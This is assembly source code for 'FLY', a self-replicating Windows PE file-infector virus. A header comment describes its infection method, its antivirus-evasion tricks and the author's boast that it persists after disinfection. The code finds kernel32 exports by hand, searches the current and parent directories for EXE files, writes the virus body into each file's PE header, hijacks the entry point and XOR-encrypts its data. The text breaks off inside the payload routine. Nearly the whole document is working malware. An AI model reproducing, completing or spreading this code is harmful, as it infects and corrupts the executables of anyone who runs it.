
;@ECHO OFF
;GOTO MAKE

COMMENT @
				-=[ FLY ]=-
		               a lame virus
		                 by yoda
version: 1.21

Music..................borrowed Nirvana-Nevermind CD/Busta Rhymes/KKS/RunDMC
Assembler..............MASM
Editor.................UltraEdit32
Reason for coding......last school holiday day :)
Target files...........PE32/PE32+ EXE files
Payload................MessageBox if PC is already 30min up

It was nice to find out that KAV added FLY 1.1 to its virii database as Win32.Small.1144.
The edge is that they didn't find the "FLY" trademark in the header and so it rests in
disinfected files :)
This version is fully recoded. The old code was often less optimized and such things.
FLY 1.2 infects 32/64 bit EXE files in the current and in all subdirectries (it's called
dot dot methode, I think).
Whereby I don't know whether infected PE32+ files will run...I think:NO...in this case you'll
have to look at FLY as a PE32 infector with a PE32+ destruction feature :)
The virus body is neither appended at the target file image nor it's written into a
section (like the RelocationDirectory section - .reloc). First I patch the file image
to make the SizeOfHeaders 0x1000...move sections physically, fix NT/ST headers... And after
that the virus body is written into the PE header. I didn't include any BoundImportDirectory
processing. This Directory is always (I think) stored in the PE Header (after the
SectionHeaderTable). If present, it maybe gets overwritten, so I simply clear the BoundImport
DataDirectory in the DataDirectoryEntryTable.
The EntryPoint RVA in the header of the victim isn't changed. FLY assembles...
	PUSH    ptr_to_virus_body
	RET
...at the EntryPoint and when the execution of the virus body is finished, it rewrites the
orginal EntryPoint bytes and jumps to it.
Because we don't have write access in the PE header in memory, one of the first steps FLY does
is getting this access by the VirtualProtect API.
I generally tried to avoid strings like "*.exe", "MZ", "MessageBoxA" in the virus body. This
is reallized by different ways:obfuscation values, build strings on stack or by XORing the
data partion of the virus. Any other protection schemes like Anti-Debugging, Polymorphism or
things like that aren't used.
Payload is a simply but topmost :) MessageBox if the PC is already 30min up.

Disclaimer:
~~~~~~~~~~~
I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SOURCE CODE NOR IT'S COMPILED EXECUTABLE !
I JUST CODED "FLY" FOR EDUCATION PURPOSES !

History:
~~~~~~~~
1.21: ( Virsu size: 0x715 Bytes )
- finally added SEH frame in "GetNTHeaders" routine

1.2: ( Virus size: 0x6D7 Bytes )
- all recoded (see above)
- [...]

1.1: ( Virus size: 0x484 Bytes / 1156 Bytes )
- Code optimized a bit
- Boring PER added
- API string CRC method added
- Minor bugfixes

1.0: ( Virus size: 0x560 Bytes / 1376 Bytes )
- first release

yoda

@

.386
.MODEL flat,stdcall
OPTION CASEMAP : NONE

; ------ INCLUDE's ----------------------------------------------------------------------
INCLUDE     \masm32\include\windows.inc

INCLUDE     \masm32\include\kernel32.inc
INCLUDELIB  \masm32\lib\kernel32.lib

; ------ STRUCTS-------------------------------------------------------------------------
PUSHA_STRUCT STRUCT 1
	_EDI              DWORD ?
	_ESI              DWORD ?
	_EBP              DWORD ?
	_ESP              DWORD ?
	_EBX              DWORD ?
	_EDX              DWORD ?
	_ECX              DWORD ?
	_EAX              DWORD ?
PUSHA_STRUCT ENDS

;SEH_DATA STRUCT 1
;	dwNewESP          DWORD ?
;	dwNewEIP          DWORD ?
;SEH_DATA ENDS

IMAGE_OPTIONAL_HEADER64 STRUCT 1
  Magic                         WORD       ?
  MajorLinkerVersion            BYTE       ?
  MinorLinkerVersion            BYTE       ?
  SizeOfCode                    DWORD      ?
  SizeOfInitializedData         DWORD      ?
  SizeOfUninitializedData       DWORD      ?
  AddressOfEntryPoint           DWORD      ?
  BaseOfCode                    DWORD      ?
  ImageBase                     QWORD      ?
  SectionAlignment              DWORD      ?
  FileAlignment                 DWORD      ?
  MajorOperatingSystemVersion   WORD       ?
  MinorOperatingSystemVersion   WORD       ?
  MajorImageVersion             WORD       ?
  MinorImageVersion             WORD       ?
  MajorSubsystemVersion         WORD       ?
  MinorSubsystemVersion         WORD       ?
  Win32VersionValue             DWORD      ?
  SizeOfImage                   DWORD      ?
  SizeOfHeaders                 DWORD      ?
  CheckSum                      DWORD      ?
  Subsystem                     WORD       ?
  DllCharacteristics            WORD       ?
  SizeOfStackReserve            QWORD      ?
  SizeOfStackCommit             QWORD      ?
  SizeOfHeapReserve             QWORD      ?
  SizeOfHeapCommit              QWORD      ?
  LoaderFlags                   DWORD      ?
  NumberOfRvaAndSizes           DWORD      ?
  DataDirectory                 IMAGE_DATA_DIRECTORY IMAGE_NUMBEROF_DIRECTORY_ENTRIES dup(<>)
IMAGE_OPTIONAL_HEADER64 ENDS

IMAGE_NT_HEADERS64 STRUCT 1
  Signature         DWORD                   ?
  FileHeader        IMAGE_FILE_HEADER       <>
  OptionalHeader    IMAGE_OPTIONAL_HEADER64 <>
IMAGE_NT_HEADERS64 ENDS

; ------ EQU's --------------------------------------------------------------------------
OBFUSCATION_VAL           EQU 018273645h
FLY_BODY_SIZE             EQU (FLY_END - FLY_START)
FLY_TRADEMARK             EQU "YLF"                                 ; pasted in FileHeader.PointerToSymbolTable
VIRUS_OFFSET              EQU (01000h - FLY_BODY_SIZE)
MIN_PAYLOAD_TICK          EQU 30 * 60 * 1000                        ; (30 min)

; ------ CODE ---------------------------------------------------------------------------
.CODE
	ASSUME FS : NOTHING
Main:
	CALL GetVersion			; The compiled exe won't run on Win2k without any Imports :(
	                                ; This call is just for the first generation

FLY_START:
;	INT  3
	;-> receive delta
	PUSHAD
	CALL    get_delta
  get_delta:
        ADD     DWORD PTR [ESP], OBFUSCATION_VAL
        LEA     EBX, [OFFSET get_delta + OBFUSCATION_VAL]
        POP     EBP
        SUB     EBP, EBX
        
        ;-> get kernel ImageBase
        PUSH    [ESP].PUSHA_STRUCT._ESP
        CALL    GetKernelBase
        TEST    EAX, EAX
        JZ      total_quit
        MOV     EDI, EAX                                             ; EDI -> K32 base
        
        ;-> get write access for the virus body (in PE Header is usually ReadOnly access)
        SUB     ESP, 16
        MOV     ESI, ESP                                             ; ESI -> base ptr of our little stack frame
        MOV     DWORD PTR [ESI], "triV"                              ;
        MOV     DWORD PTR [ESI + 4], "Plau"                          ;
        MOV     DWORD PTR [ESI + 8], "etor"                          ;
        MOV     DWORD PTR [ESI + 12], "tc"                           ; build "VirtualProtect\0" str on stack
        PUSH    15
        PUSH    ESI
        PUSH    EDI
        CALL    GetProcAddr
        ADD     ESP, 16
        PUSH    EAX                                                  ; reserve a DWORD on the stack as lpflOldProtect buff
        PUSH    ESP
        PUSH    PAGE_EXECUTE_READWRITE
        PUSH    FLY_BODY_SIZE
        LEA     EBX, [EBP + FLY_START]
        PUSH    EBX
        CALL    EAX                                                  ; modify page access via VirtualProtect        
        POP     EAX
        
        ;-> dexor our data partition
        MOV     EBX, [EBP + dwEPRva]                                 ; EBX -> EntryPoint RVA (arg1)
        CALL    GetXorByte                                           ; returns 0 in first generation
        PUSH    EAX
        PUSH    (Variable_Crypt_End - Variable_Crypt_Start)
        LEA     EAX, [EBP + Variable_Crypt_Start]
        PUSH    EAX
        CALL    memxor          
        
        MOV     [EBP + dwK32Base], EDI                               ; now we can save the K32 base

        ;-> collect addresses of needed APIs
        CALL    GrabAPIs
        
        ;-> PE infection
        MOV     EBX, EBP
        CALL    TraceAndInfectDirectory
        
	;-> return to OS/original EntryPoint
	TEST    EBP, EBP                                             ; EBP == 0 -> first generation
	JNZ     non_virgin_generation
  total_quit:
	POPAD
	RET                                                          ; return to OS
	
  non_virgin_generation:
        ;-> payload
        CALL    DriveUserNutsHiHi
        ;-> move EntryPoint ptr to EDI of the popad'd regs
        MOV     EAX, [EBP + dwImageBase]
        ADD     EAX, [EBP + dwEPRva]
        MOV     [ESP].PUSHA_STRUCT._EDI, EAX
        ;-> restore bytes at the EntryPoint
        PUSH    6
        PUSH    EAX
        LEA     EAX, [EBP + bEntryData]
        PUSH    EAX
        CALL    memcpy
        POPAD
        JMP     EDI                                                  ;-> jump to victim's EntryPoint
	
;
; Args:
; [ESP + 4]   - initial ESP value
;
; Returns:
; ImageBase of Kernel32.dll or 0 in EAX
;
; Reserved Regs: NO
;
GetKernelBase:
ARG_1 EQU [ESP + 4]
	;INT     3
	; wipe LOWORD of K32 ptr
	MOV     ESI, ARG_1
	MOV     ESI, [ESI]                                           ; ESI -> ptr into K32
	SAR     ESI, 16                                              ;
	SAL     ESI, 16                                              ; ESI &= 0xFFFF0000
  @@test_4_PE_hdr:
	PUSH    ESI
	CALL    GetNTHeaders
	TEST    EAX, EAX
	JZ      @F
	; K32 PE hdr found !
	XCHG    EAX, ESI		
	JMP     @@exit_proc
  @@:
  	SUB     ESI, 000010000h
  	JMP     @@test_4_PE_hdr
  @@exit_proc:
	RET     4
	
;
; Args:
; [ESP + 4]   - ptr to an PE image
; EBP         - delta !
;
; Returns:
; the ptr to the NT headers of NULL in case of an error
;
; Reserved Regs: ALL
;
GetNTHeaders:
ARG_1 EQU [ESP + 4 + 2*4 + SIZEOF PUSHA_STRUCT]
;	INT    3
	PUSHAD
	; set up SEH frame
	SUB     EAX, EAX
	LEA     EBX, [EBP + SehHandler]
	PUSH    EBX
	PUSH    FS:[EAX]
	MOV     FS:[EAX], ESP
	; process
	SUB     EAX, EAX                                             ; EAX -> 0 (result REG)
	MOV     ESI, ARG_1                                           ; ESI -> pImage
	MOVZX   EDX, WORD PTR [ESI]
	ADD     EDX, 1234
	SUB     EDX, "ZM" + 1234
	JNZ     GetNTHeaders_exit
	MOV     EDI, DWORD PTR [ESI].IMAGE_DOS_HEADER.e_lfanew
	MOV     EDX, [EDI + ESI]
	SUB     EDX, 4321
	SUB     EDX, "EP" - 4321
	JNZ     GetNTHeaders_exit
	LEA     EAX, [EDI + ESI]	
  GetNTHeaders_exit:
	SUB     EBX, EBX
	POP     FS:[EBX]
	ADD     ESP, 4 
	MOV     [ESP].PUSHA_STRUCT._EAX, EAX                              ; EAX -> popad'd REGs
	POPAD
	RET     4
	
SehHandler PROC C pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
;	INT     3
	;-> modify EIP and continue execution
	MOV     EAX, pContext                                        ; EAX -> context ptr
	MOV     ECX, [EAX].CONTEXT.regEbp                            ; ECX -> debuggee's EBP
	LEA     EBX, [ECX + GetNTHeaders_exit]
	MOV     [EAX].CONTEXT.regEip, EBX
	MOV     EAX, ExceptionContinueExecution
	RET
SehHandler ENDP  	
	
;
; void* GetProcAddr(HINSTANCE hDLL, char* szAPI, DWORD dwcAPIStrSize);
;
; Returns:
; NULL     - in case of an error
;
; Reserved Regs: Win32 API
;
GetProcAddr:
ARG_1 EQU [ESP +  4]
ARG_2 EQU [ESP +  8]
ARG_3 EQU [ESP + 12]
	PUSH    EBX
	PUSH    ESI
	PUSH    EDI
	MOV     EDX, [ESP + 4 + 12]                                  ; EDX -> dll base
	
	; get ptr to NT hdrs
	PUSH    EDX
	CALL    GetNTHeaders
	TEST    EAX, EAX                                             ; EAX -> ptr to NT hdrs
	JZ      @@GetProcAddr_exit
	
	; get ptr to ExportTable (PE32/PE32+ dependent code)
	CMP     WORD PTR [EAX].IMAGE_NT_HEADERS.OptionalHeader.Magic, IMAGE_NT_OPTIONAL_HDR32_MAGIC
	JNZ     get_exp_table_rva_64
	MOV     EDI, [EAX].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
	JMP     @F
  get_exp_table_rva_64:
  	MOV     EDI, [EAX].IMAGE_NT_HEADERS64.OptionalHeader.DataDirectory[0].VirtualAddress
  @@:
  	ADD     EDI, EDX                                             ; EDI -> exp table RVA
  	MOV     ESI, [EDI].IMAGE_EXPORT_DIRECTORY.AddressOfNames     ; ESI -> exp symbol names chain RVA
  	ADD     ESI, EDX
  	SUB     EBX, EBX                                             ; EBX = chain index
  	
  process_name:
        ; compare API strings
        LODSD
        PUSHAD
        LEA     EDI, [EAX + EDX]
        MOV     ESI, [ESP + 8 + SIZEOF PUSHA_STRUCT + 12]
        MOV     ECX, [ESP + 12 + SIZEOF PUSHA_STRUCT + 12]
        REPZ    CMPSB
        POPAD
        JZ      API_name_found_in_chain  	
  	INC     EBX
  	CMP     EBX, [EDI].IMAGE_EXPORT_DIRECTORY.NumberOfNames
  	JNZ     process_name
  	; (all names processed but nothing found)
  	SUB     EAX, EAX
  	JZ      @@GetProcAddr_exit
  	
  API_name_found_in_chain:
        ; grab corresponding ordinal
        MOV     EAX, [EDI].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
        ADD     EAX, EDX                                             ; EAX -> ordinal chain ptr
        MOVZX   ECX, WORD PTR [EAX + EBX*2]                          ; ECX -> symbol ordinal
        
        ; finally get symbol RVA
        MOV     EAX, [EDI].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
        ADD     EAX, EDX                                             ; EAX -> symbol RVA chain ptr
        MOV     EAX, [EAX + ECX*4]	
        ADD     EAX, EDX                                             ; EAX -> symbol ptr
  @@GetProcAddr_exit:
        POP     EDI
        POP     ESI
        POP     EBX
	RET     12
	
;
; Reserved Regs: NO
;
GrabAPIs:
	LEA     ESI, [EBP + OFFSET API_table]                        ; ESI -> first API table entry
  NextApiTableEntry:
	; receive API addr of current struct
	MOVZX   EDI, BYTE PTR [ESI]                                  ; EDI -> API str length
	PUSH    EDI
	LEA     EAX, [ESI + 5]
	PUSH    EAX
	PUSH    [EBP + dwK32Base]
	CALL    GetProcAddr
	INC     ESI                                                  ; ESI += 1
	MOV     [ESI], EAX
	; process next struct
	ADD     ESI, EDI
	ADD     ESI, 4
	SUB     EAX, EAX
	CMP     BYTE PTR [ESI], AL
	JNZ	NextApiTableEntry
	RET
	
;
; Args:
; EBX - delta
;
; Reserved Regs: NO
;
TraceAndInfectDirectory PROC
	LOCAL   WFD                 : WIN32_FIND_DATA
	LOCAL   cPath[MAX_PATH]     : BYTE
	LOCAL   hFind               : HANDLE
	
	; get current directory
	LEA     ESI, cPath                                           ; ESI -> path buffer
	PUSH    ESI
	PUSH    MAX_PATH
	CALL    [EBX + _GetCurrentDirectory]
  process_current_dir:
        PUSH    EAX                                                  ; reserve path length
        PUSH    ESI
        CALL    [EBX + _SetCurrentDirectory]
        POP     EAX
        LEA     EDI, [ESI + EAX]
	MOV     AX, "*\"
	STOSW
	MOV     AX, "E."
	STOSW
	MOV     AX, "EX"
	STOSW
	SUB     EAX, EAX
	STOSB
	LEA     EDI, WFD                                             ; EDI -> WIN32_FIND_DATA ptr
	PUSH    EDI
	PUSH    ESI
	CALL    [EBX + _FindFirstFile]
	MOV     hFind, EAX
	INC     EAX
	JZ      trace_previous_dir
  next_file_in_dir:
  	LEA     EAX, [EDI].WIN32_FIND_DATA.cFileName
  	PUSH    EAX
  	CALL    InfectFile
  	PUSH    EDI
  	PUSH    hFind
  	CALL    [EBX + _FindNextFile]
  	DEC     EAX
  	JZ      next_file_in_dir  	
  trace_previous_dir:
        PUSH    ESI
        CALL    WipeLastDirInPath
        JC      process_current_dir                  
	; cleanup
	PUSH    hFind
	CALL    [EBX + _FindClose]
  TraceAndInfectDirectory_exit:
	RET
TraceAndInfectDirectory ENDP

;
; if the last directory was successfully ripped from path string then the carry flag is set
; addionally the new path string size is returned in EAX
;
; Args:
; [ESP +  4] - path buffer
;
; Reserved Regs: Win32 API
;
WipeLastDirInPath:
ARG_1 EQU [ESP + 4]
	PUSH    EBX
	PUSH    ESI
	PUSH    EDI
	CLC
	CLD
	SUB     EAX, EAX
	MOV     EDI, ARG_1
	MOV     ECX, MAX_PATH
	REPNZ   SCASB
	STD
	MOV     AL, "\"
	NEG     ECX
	ADD     ECX, MAX_PATH
	REPNZ   SCASB
	TEST    ECX, ECX
	JZ      WipeLastDirInPath_exit
	REPNZ   SCASB
	TEST    ECX, ECX
	JZ      WipeLastDirInPath_exit
	CMP     ECX, 1                                               ; will result be a root path (e.g. C:\) ?
	JZ	root_path
	MOV     BYTE PTR [EDI + 1], 0                                ; set new NUL terminator
	JMP     SHORT ret_new_str
  root_path:
        MOV     BYTE PTR [EDI + 2], 0
  ret_new_str:
	LEA     EAX, [ECX + 1]                                       ; EAX -> return string size
	STC
  WipeLastDirInPath_exit:
        POP     EDI
        POP     ESI
        POP     EBX
	CLD
	RET     4

;
; Args:
; EBX - delta
;
; Reserved Regs: ALL
; 
; Returns: void
;
;
InfectFile PROC szFname
	LOCAL   hFile           : HANDLE
	LOCAL   dwFSize         : DWORD
	LOCAL   dwc             : DWORD
	LOCAL   b64Bit          : DWORD
	LOCAL   dwHdrSizeDelta  : DWORD
;	LOCAL   dwRealHdrSize   : DWORD
	LOCAL   dwFirstSecRO    : DWORD
	LOCAL   pFirstSecHdr    : DWORD
	LOCAL   dwMemBlockSize  : DWORD
	LOCAL   pVirusBody      : DWORD
;	LOCAL   dwViriiOffset   : DWORD  ; Offset (without any Mem- or ImageBase)
	LOCAL   dwVictimBase    : DWORD

	PUSHAD
	; -> get write access to the file and map it to memory
	XOR     EAX, EAX
	PUSH    EAX
	PUSH    FILE_ATTRIBUTE_NORMAL
	PUSH    OPEN_EXISTING
	PUSH    EAX
	PUSH    FILE_SHARE_WRITE + FILE_SHARE_READ
	PUSH    GENERIC_WRITE + GENERIC_READ
	PUSH    szFname
	CALL    [EBX + _CreateFile]
	MOV     hFile, EAX
	INC     EAX
	JZ      InfectFile_exit
	SUB     EAX, EAx
	PUSH    EAX
	PUSH    hFile
	CALL    [EBX + _GetFileSize]
	MOV     dwFSize, EAX
	ADD     EAX, 01000h                                          ; add max hdr size to size of mem
	PUSH    EAX
	PUSH    GMEM_FIXED OR GMEM_ZEROINIT
	CALL    [EBX + _GlobalAlloc]
	OR      EAX, EAX
	JZ      cleanup_free_mem
	MOV     ESI, EAX                                             ; ESI -> mem ptr
	SUB     EAX, EAX
	PUSH    EAX
	LEA     EAX, dwc
	PUSH    EAX
	PUSH    dwFSize
	PUSH    ESI
	PUSH    hFile
	CALL    [EBX + _ReadFile]
	
	; -> get ptr to NT hdrs and check whether the file was already infect
	PUSH    EBP
	MOV     EBP, EBX
	PUSH    ESI
	CALL    GetNTHeaders
	POP     EBP
	OR      EAX, EAX
	JZ      cleanup_free_mem
	MOV     EDI, EAX                                             ; EDI -> NT hdrs
	MOV     EAX, [EDI].IMAGE_NT_HEADERS.FileHeader.PointerToSymbolTable
	ADD     EAX, OBFUSCATION_VAL
	CMP     EAX, FLY_TRADEMARK + OBFUSCATION_VAL
	JZ      cleanup_free_mem
	
	;-> check for PE32+
	SUB     EAX, EAX
	CMP     WORD PTR [EDI].IMAGE_NT_HEADERS.OptionalHeader.Magic, IMAGE_NT_OPTIONAL_HDR64_MAGIC
	SETZ    AL
	MOV     b64Bit, EAX
	
	PUSH    EBX                                                  ; !!! reserve unneeded delta to stack

	;-> get section hdr ptr
	MOV     AX, [EDI].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	LEA     EBX, [EAX + EDI + 4 + SIZEOF IMAGE_FILE_HEADER]      ; EBX -> section hdr table ptr
	MOV     pFirstSecHdr, EBX
	
	;
	;-> infect file image
	;
	
	; -> get real size of hdrs, test whether the virus body has enough space there
	SUB     EDX, EDX
	MOV     EAX, SIZEOF IMAGE_SECTION_HEADER
	MOVZX   ECX, [EDI].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	MUL     ECX
	MOVZX   EDX, [EDI].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	LEA     EDX, [EAX + EDX + 4 + SIZEOF IMAGE_FILE_HEADER]
	ADD     EDX, [ESI].IMAGE_DOS_HEADER.e_lfanew                  ; (EDX = real size of headers)
;  	MOV     dwRealHdrSize, EDX
  	NEG     EDX
  	ADD     EDX, 01000h                                           ; EDX -> delta to hdr with 0x1000 size
  	CMP     EDX, FLY_BODY_SIZE                                    ; enough size in header ?
  	JGE     @F
  	POP     EBX
  	JMP     cleanup_free_mem
  @@:
  	; -> get the RawOffset of the first section
  	SUB     EDX, EDX
  	DEC     EDX                                                  ; EDX -> MAX_DWORD
  	MOV     EAX, EBX                                             ; EAX -> first section header
  	MOVZX   ECX, [EDI].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
  scan_sec_hdr_for_low_RO:
        CMP     [EAX].IMAGE_SECTION_HEADER.PointerToRawData, EDX
        JAE     @F
        MOV     EDX, [EAX].IMAGE_SECTION_HEADER.PointerToRawData
  @@:
        ADD     EAX, SIZEOF IMAGE_SECTION_HEADER                     ; EAX += sizeof(IMAGE_SECTION_HEADER)
        LOOP    scan_sec_hdr_for_low_RO
        MOV     dwFirstSecRO, EDX
        NEG     EDX
        ADD     EDX, 01000h
        MOV     dwHdrSizeDelta, EDX
        
	POP     EBX                                                  ; restore delta from stack -> EBX        
  	
  	; -> patch the file image, so that it'll have a SizeOfHeaders of 0x1000
        ; move all sections by the calucalated delta back
;        INT     3
        MOV     EDX, dwFirstSecRO
        NEG     EDX
        ADD     EDX, dwFSize                                         ; EDX -> mem block size
        MOV     dwMemBlockSize, EDX
        PUSH    EDX
        PUSH    GMEM_FIXED OR GMEM_ZEROINIT
        CALL    [EBX + _GlobalAlloc]
        TEST    EAX, EAX
        JZ      cleanup_free_mem
        ; sections -> memory buffer
        XCHG    EDX, EAX                                             ; EDX -> mem block ptr
        PUSH    dwMemBlockSize
        PUSH    EDX
        MOV     EAX, dwFirstSecRO
        ADD     EAX, ESI                                             ; EAX -> ptr to first section
        PUSH    EAX
        CALL    memcpy
        ; memory buffer -> new location for sections (offset + dwHdrSizeDelta)
        PUSH     dwMemBlockSize
        LEA      EAX, [ESI + 01000h]
        PUSH     EAX
        PUSH     EDX
        CALL     memcpy
        
        PUSH    EDI
        CALL    [EBX + _GlobalFree]        
        
        ;-> fix section header table
        PUSH    EBX                                                  ; ! reserve EBX
        MOVZX   ECX, [EDI].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        MOV     EAX, pFirstSecHdr                                    ; EAX -> first section hdr
        MOV     EDX, dwHdrSizeDelta                                  ; EDX -> hdr delta
        SUB     EBX, EBX                                             ; EBX -> 0
  fix_and_replace_section:
        CMP     [EAX].IMAGE_SECTION_HEADER.PointerToRawData, EBX
        JZ      @F
        ADD     [EAX].IMAGE_SECTION_HEADER.PointerToRawData, EDX
        @@:
        ADD     EAX, SIZEOF IMAGE_SECTION_HEADER
  	LOOP    fix_and_replace_section	
  	POP     EBX                                                  ; ! restore EBX
  	
        ;-> insert virus body after the SectionHeaderTable
;	INT     3
        PUSHAD
        LEA     EDI, [ESI + VIRUS_OFFSET]                            ; EDI -> ptr to the end of the SectionHeaderTable
        LEA     ESI, [EBX + FLY_START]                               ; ESI -> start of the virus body
        MOV     ECX, FLY_BODY_SIZE
        REP     MOVSB
        POPAD

  	;-> insert EntryPoint RVA and ImageBase into virus body
  	LEA     EDX, [ESI + VIRUS_OFFSET]                            ; EDX -> virus body ptr (in victim)
  	MOV     pVirusBody, EDX
	; save OEP
  	PUSH    DWORD PTR [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
  	POP     DWORD PTR [EDX + (OFFSET dwEPRva - OFFSET FLY_START)]
  	; save ImageBase
  	MOV     EAX, b64Bit
  	DEC     EAX
  	JZ      ImageBase_is_qword
  	PUSH    [EDI].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
  	JMP     @F
  ImageBase_is_qword:
        PUSH    DWORD PTR [EDI.IMAGE_NT_HEADERS64.OptionalHeader.ImageBase]
  @@:
        POP     EAX
        MOV     dwVictimBase, EAX
        MOV     [EDX + (OFFSET dwImageBase - OFFSET FLY_START)], EAX
        
        ; -> redirect EntryPoint, i.e.
        ; Victim_EntryPoint:   PUSH    virii_entry_VA  (5 bytes)
        ;                      RET                     (6 bytes)
        ;INT     3
        ; find section belonging to the EntryPoint
        PUSHAD
        PUSH    [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
        MOVZX   EAX, [EDI].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        PUSH    EAX
        PUSH    pFirstSecHdr
        CALL    RvaToSection                                         ; EAX -> sec hdr to which the EntryPoint RVA refers
        MOV     [ESP].PUSHA_STRUCT._EAX, EAX
        POPAD
        TEST    EAX, EAX
        JZ      cleanup_free_mem
        ; save bytes at EntryPoint
        MOV     EDX, [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
        SUB     EDX, [EAX].IMAGE_SECTION_HEADER.VirtualAddress
        ADD     EDX, [EAX].IMAGE_SECTION_HEADER.PointerToRawData     ; EDX -> EntryPoint Offset
        ADD     EDX, ESI                                             ; EDX -> EntryPoint Ptr
        PUSH    6
        MOV     ECX, pVirusBody
        ADD     ECX, (OFFSET bEntryData - OFFSET FLY_START)
        PUSH    ECX
        PUSH    EDX
        CALL    memcpy
        ; assemble PUSH,RET at entry
        MOV     BYTE PTR [EDX], 068h
        MOV     ECX, VIRUS_OFFSET
        ADD     ECX, dwVictimBase
        MOV     DWORD PTR [EDX + 1], ECX
        MOV     BYTE PTR [EDX + 5], 0C3h
        ; set write flag in EntryPoint section
        OR      [EAX].IMAGE_SECTION_HEADER.Characteristics, 080000000h
                
  	;-> update NT hdrs
  	MOV     [EDI].IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders, 01000h
  	LEA     EAX, [EDI].IMAGE_NT_HEADERS.FileHeader.PointerToSymbolTable
  	MOV     DWORD PTR [EAX], (FLY_TRADEMARK - OBFUSCATION_VAL)
  	ADD     DWORD PTR [EAX], (OBFUSCATION_VAL)
  	; change EntryPoint
  	;PUSH    dwRealHdrSize
  	;POP     [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint	
  	MOV     EDX, [EDI].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint    ; EDX -> Entry RVA
  	; clear BoundImport because if it had been present we overwrote it with the virus body
  	LEA     EDI, [EDI].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[11 * 8].VirtualAddress
  	SUB     EAX, EAX
  	STOSD
  	STOSD
  	
  	;-> encrypt data parition
  	PUSHAD
  	MOV     EBX, EDX
  	CALL    GetXorByte                                           ; arg pushed above
  	PUSH    EAX
  	PUSH    (Variable_Crypt_End - Variable_Crypt_Start)
  	LEA     EAX, [ESI + (VIRUS_OFFSET + (Variable_Crypt_Start - FLY_START))]
  	PUSH    EAX
  	CALL    memxor
  	POPAD
	
  	;-> write mem to file
  	SUB     EDI, EDI                                             ; EDI -> 0
  	PUSH    FILE_BEGIN
  	PUSH    EDI
  	PUSH    EDI
  	PUSH    hFile
  	CALL    [EBX + _SetFilePointer]  	
  	PUSH    EDI
  	LEA     EAX, dwc
  	PUSH    EAX
  	MOV     EAX, dwFSize
  	ADD     EAX, dwHdrSizeDelta
  	PUSH    EAX
  	PUSH    ESI
  	PUSH    hFile
  	CALL    [EBX + _WriteFile]  	

  cleanup_free_mem:
  	PUSH    ESI
  	CALL    [EBX + _GlobalFree]
  cleanup_file_handle:
  	PUSH    hFile
  	CALL    [EBX + _CloseHandle]
  InfectFile_exit:
        POPAD
	RET
InfectFile ENDP

;
; Args:
; [ESP  + 4] - ptr to first section header
; [ESP  + 8] - number of sections
; [ESP  + C] - dwRVA
;
; Returns:
; NULL in case of an error or PIMAGE_SECTION_HEADER
;
; ReservedRegs: NO
;
RvaToSection:
ARG_1 EQU [ESP +  4]
ARG_2 EQU [ESP +  8]
ARG_3 EQU [ESP + 12]

	ASSUME  ESI : PTR IMAGE_SECTION_HEADER
        SUB     EAX, EAX
	MOV     ESI, ARG_1                                           ; ESI -> ptr to first section hdr
	MOV     ECX, ARG_2                                           ; ECX -> number of sections
	MOV     EDI, ARG_3                                           ; EDI -> target rva
        SUB     EBX, EBX                                             ; EBX -> 0
  section_header_scan_loop:
  	MOV     EDX, [ESI].VirtualAddress                            ; RVA >= VirtualAddress ?
        CMP     EDI, EDX
        JB      @F
        CMP     [ESI].Misc.VirtualSize, EBX                          ; VS == 0 (needed for Watcom files)
        JZ      add_RawSize_instead
        ADD     EDX, [ESI].Misc.VirtualSize                          ; RVA < VirtualAddress + VirtualSize ?
        JMP     compare
  add_RawSize_instead:
        ADD     EDX, [ESI].SizeOfRawData
  compare:
        CMP     EDI, EDX
        JAE     @F
        JMP     scan_done
  @@:
        ADD     ESI, SIZEOF IMAGE_SECTION_HEADER
        LOOP    section_header_scan_loop
        ASSUME  ESI : NOTHING
  scan_done:	
        TEST    ECX, ECX
        JZ      @F
        XCHG    EAX, ESI
  @@:
	RET     12

;
; Args:
; [ESP  + 4] - src
; [ESP  + 8] - dest
; [ESP  + C] - soue
;
; ReservedRegs: ALL
;
memcpy:
ARG_1 EQU [ESP +  4 + SIZEOF PUSHA_STRUCT]
ARG_2 EQU [ESP +  8 + SIZEOF PUSHA_STRUCT]
ARG_3 EQU [ESP + 12 + SIZEOF PUSHA_STRUCT]
	PUSHAD
	MOV     ESI, ARG_1
	MOV     EDI, ARG_2
	MOV     ECX, ARG_3
	REP     MOVSB
	POPAD
	RET     12
	
;
; Args:
; [ESP  +  4] - src
; [ESP  +  8] - size
; [ESP  +  C] - xor byte
;
; ReservedRegs: ALL
;
memxor:
ARG_1 EQU [ESP +  4 + SIZEOF PUSHA_STRUCT]
ARG_2 EQU [ESP +  8 + SIZEOF PUSHA_STRUCT]
ARG_3 EQU [ESP + 12 + SIZEOF PUSHA_STRUCT]
	PUSHAD
	MOV     ESI, ARG_1                                           ; ESI -> data ptr
	MOV     ECX, ARG_2
	MOV     EAX, ARG_3                                           ; EAX -> xor byte
  memxor_loop:
  	XOR     BYTE PTR [ESI], AL
  	INC     ESI
  	LOOP    memxor_loop          	
	POPAD
	RET     12	
	
;
; this is the payload
;
; ReservedRegs: ALL
;	
DriveUserNutsHiHi:
	; PC already MIN_PAYLOAD_TICK seconds up ?
	CALL    [EBP + _GetTickCount]
	CMP     EAX, MIN_PAYLOAD_TICK
	JB      DriveUserNutsHiHi_exit
	; build "USER32\0" on stack
	SUB     ESP, 8
